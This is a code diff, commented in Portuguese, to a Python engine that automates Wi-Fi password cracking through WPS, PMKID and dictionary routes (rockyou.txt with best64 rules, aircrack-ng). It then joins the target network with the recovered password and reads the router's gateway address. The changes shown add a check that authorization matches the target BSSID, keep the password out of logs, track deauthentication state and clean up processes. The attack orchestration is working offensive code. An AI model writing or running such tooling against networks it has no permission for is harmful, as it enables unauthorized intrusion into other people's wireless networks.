+                self.log("Senha encontrada via aircrack-ng/wordlist extra (valor redigido do log).")
                 return True
 
         self.log("Senha não encontrada no dicionário rockyou.txt + regras best64.")
@@ -823,8 +1134,10 @@ class Engine:
     def executar_ataque(self, mascara=None):
         """mascara: dict opcional {tamanho, prefixo, tipo} — se vier, tenta
         a Rota A primeiro. Senão, segue direto WPS -> PMKID -> Dicionário."""
-        if not self.autorizado:
-            raise RuntimeError("Autorização não confirmada. Abortando antes de qualquer ataque.")
+        if not self.autorizacao_valida():
+            raise RuntimeError(
+                "Autorização ausente ou pertence a outro BSSID. Abortando antes de qualquer ataque."
+            )
 
         self._mask = mascara  # guarda p/ a Rota D (PMKID) reusar se a Rota A falhar
 
@@ -872,7 +1185,18 @@ class Engine:
         time.sleep(3)
 
         self.log(f"Conectando à rede {self.target['essid']} com a senha descoberta...")
-        self.run(["nmcli", "dev", "wifi", "connect", self.target["essid"], "password", self.senha])
+        r = self.run(
+            [
+                "nmcli", "dev", "wifi", "connect", self.target["essid"],
+                "password", self.senha, "bssid", self.target["bssid"],
+                "ifname", self.iface,
+            ],
+            timeout=45,
+            ocultar=(self.senha,),
+        )
+        if r.returncode != 0:
+            self.log(f"Falha ao conectar ao BSSID selecionado (rc={r.returncode}).")
+            return False
         time.sleep(5)
 
         r = self.run(["ip", "route"])
@@ -880,8 +1204,10 @@ class Engine:
         if m:
             self.ip_roteador = m.group(1)
             self.log(f"Gateway (IP do roteador) obtido: {self.ip_roteador}")
+            return True
         else:
             self.log("Não foi possível obter o gateway após conectar.")
+            return False
 
     def resumo(self):
         ch = int(self.target.get("ch", 0) or 0)
@@ -899,6 +1225,7 @@ class Engine:
             f"IP do roteador ....: {self.ip_roteador or '<não obtido>'}\n"
             f"Senha .............: {self.senha or '<não descoberta>'}\n"
             f"Rota usada ........: {self.rota_usada or '<nenhuma / somente dados>'}\n"
+            f"Deauth estado .....: {self.deauth_estado}\n"
             "===========================================================\n"
         )
         RESPOSTAS.write_text(texto)
@@ -911,12 +1238,17 @@ class Engine:
             "ip": self.ip_roteador,
             "senha": self.senha,
             "rota": self.rota_usada,
+            "deauth_estado": self.deauth_estado,
             "texto": texto,
         }
 
     def cleanup(self):
         self.log("Executando limpeza / restauração da interface...")
         try:
+            with self._processos_lock:
+                processos = list(self._processos)
+            for proc in processos:
+                self._encerrar_processo(proc)
             self.restaurar_modo_gerenciado()
         except Exception as e:  # nunca deixar a limpeza travar o programa
             self.log(f"Aviso durante limpeza: {e}")
